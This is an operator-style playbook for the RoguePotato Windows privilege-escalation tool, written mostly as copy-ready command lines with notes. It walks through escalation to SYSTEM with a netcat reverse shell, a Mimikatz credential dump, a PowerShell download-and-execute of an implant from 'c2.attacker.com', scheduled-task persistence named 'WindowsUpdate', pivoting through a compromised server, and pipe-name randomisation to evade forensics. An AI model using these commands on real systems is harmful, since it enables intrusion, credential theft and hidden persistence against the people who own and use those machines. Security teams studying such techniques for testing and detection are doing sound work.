# RoguePotato — Hands-On Use Cases

## Basic SYSTEM escalation with Chisel redirector

**MITRE ATT&CK:** T1134.003 (Access Token Manipulation), T1548.002 (Abuse Elevation Control Mechanism)

**Scenario:** You have shell access as a service account with `SeImpersonate`. You've set up a Chisel relay server on your attacker machine. Escalate to SYSTEM.

**Step 1: Set up Chisel redirector on attacker machine**

```bash
# On attacker machine (10.10.10.10):
chisel server -p 9999 --reverse
```

**Step 2: Run RoguePotato from target**

```bash
RoguePotato.exe -r 10.10.10.10:9999 -e "cmd.exe"
```

**Step 3: Verify SYSTEM access**

A SYSTEM-context cmd.exe spawns; you now have SYSTEM shell access on the target.

**Operator notes:**
- Chisel must be running on the attacker's machine before RoguePotato tries to connect.
- The redirector IP (`10.10.10.10`) must be reachable from the target (no firewall blocking).
- Without Chisel (or an equivalent RPC relay), RoguePotato will fail.

---

## Reverse shell via RoguePotato and Chisel

**MITRE ATT&CK:** T1548.002, T1090 (Proxy)

**Scenario:** Escalate to SYSTEM and establish a reverse shell through the redirector.

**Step 1: Start Chisel on attacker**

```bash
chisel server -p 9999 --reverse
```

**Step 2: Start netcat listener**

```bash
nc -lvnp 4444
```

**Step 3: Run RoguePotato with reverse shell command**

```bash
RoguePotato.exe -r 10.10.10.10:9999 -e "C:\Windows\Temp\nc.exe -e cmd 10.10.10.10 4444"
```

**Step 4: Receive shell**

You get a SYSTEM-context reverse shell on your netcat listener.

**Operator notes:**
- Ensure netcat (`nc.exe`) is pre-staged on the target.
- The reverse shell traffic may appear to originate from the target to your attacker IP, alerting defenders to the network connection.

---

## Credential dumping as SYSTEM via RoguePotato

**MITRE ATT&CK:** T1003.001 (LSASS Memory)

**Scenario:** Escalate and dump credentials.

```bash
RoguePotato.exe -r 10.10.10.10:9999 -e "cmd.exe /c C:\Windows\Temp\mimikatz.exe sekurlsa::logonpasswords > C:\Windows\Temp\creds.txt"
```

**Operator notes:**
- Output redirection to a file is essential (no interactive output visible without it).
- Mimikatz must be pre-staged.
- Retrieve the `creds.txt` file post-execution.

---

## Multi-stage C2 deployment

**MITRE ATT&CK:** T1059.001 (PowerShell), T1548.002

**Scenario:** Use RoguePotato to stage a full C2 agent as SYSTEM.

```bash
RoguePotato.exe -r 10.10.10.10:9999 -e "powershell.exe -NoProfile -Command \"IEX(New-Object System.Net.WebClient).DownloadString('http://c2.attacker.com:8080/implant.ps1')\""
```

**Operator notes:**
- Ensure the C2 server is reachable from the target.
- PowerShell IEX downloads and executes in-memory, reducing disk footprint.

---

## Internal redirector (pivot through compromised server)

**MITRE ATT&CK:** T1090 (Proxy)

**Scenario:** The target cannot reach the attacker's external IP. Use a compromised internal server (DMZ, internal pivot) as the redirector.

**Step 1: Set up Chisel on internal pivot server**

```bash
# On compromised internal server (192.168.1.100):
chisel server -p 9999 --reverse
```

**Step 2: From target, use internal pivot IP**

```bash
RoguePotato.exe -r 192.168.1.100:9999 -e "cmd.exe"
```

**Step 3: From attacker, tunnel through the pivot**

```bash
# Attacker connects to pivot's Chisel server (via VPN/SSH to pivot):
chisel client 192.168.1.100:9999 <attacker_tunnel_config>
```

**Operator notes:**
- Requires prior compromise of the internal pivot.
- Adds a hop, reducing attacker IP visibility.

---

## Windows service exploitation (MSSQL)

**MITRE ATT&CK:** T1548.002, T1003.001

**Scenario:** MSSQL service account runs with SeImpersonate. Exploit via RoguePotato.

```bash
# From MSSQL agent or xp_cmdshell:
RoguePotato.exe -r 10.10.10.10:9999 -e "cmd.exe /c whoami > C:\output.txt"
```

**Operator notes:**
- MSSQL service accounts often have SeImpersonate by default.
- Output can be written to a location readable by the MSSQL process (e.g., data directory).

---

## Custom RPC service targeting (if WER is patched)

**Scenario:** WER is patched or unavailable. Target a custom RPC service.

```bash
RoguePotato.exe -r 10.10.10.10:9999 -c "{GUID_OF_SERVICE}" -e "cmd.exe"
```

**Operator notes:**
- Requires identifying a usable CLSID (similar to JuicyPotato).
- If WER works, use the default (no `-c` flag needed).

---

## Persistence via scheduled task (post-escalation)

**MITRE ATT&CK:** T1053.005 (Scheduled Task/Job)

**Scenario:** Escalate to SYSTEM, then create persistence.

```bash
RoguePotato.exe -r 10.10.10.10:9999 -e "cmd.exe /c schtasks /create /tn \"WindowsUpdate\" /tr \"C:\Windows\Temp\implant.exe\" /sc onboot /ru system"
```

**Operator notes:**
- Requires prior Chisel setup.
- Scheduled task persists across reboots.

---

## Randomized pipe name (anti-forensics)

**Scenario:** Hide RoguePotato's named-pipe signature by randomizing it.

```bash
RoguePotato.exe -r 10.10.10.10:9999 -e "cmd.exe" -z
```

The `-z` flag generates a random pipe name instead of "RoguePotato" or a predictable variant.

**Operator notes:**
- Reduces static signatures but doesn't prevent behavioral detection.

---

## Summary

RoguePotato's workflow is **redirector-dependent**. Unlike PrintSpoofer/JuicyPotato (local-only), RoguePotato requires external infrastructure (Chisel or custom relay) and introduces network-observable traffic. The trade-off: greater compatibility with patched systems, at the cost of increased complexity and network visibility.
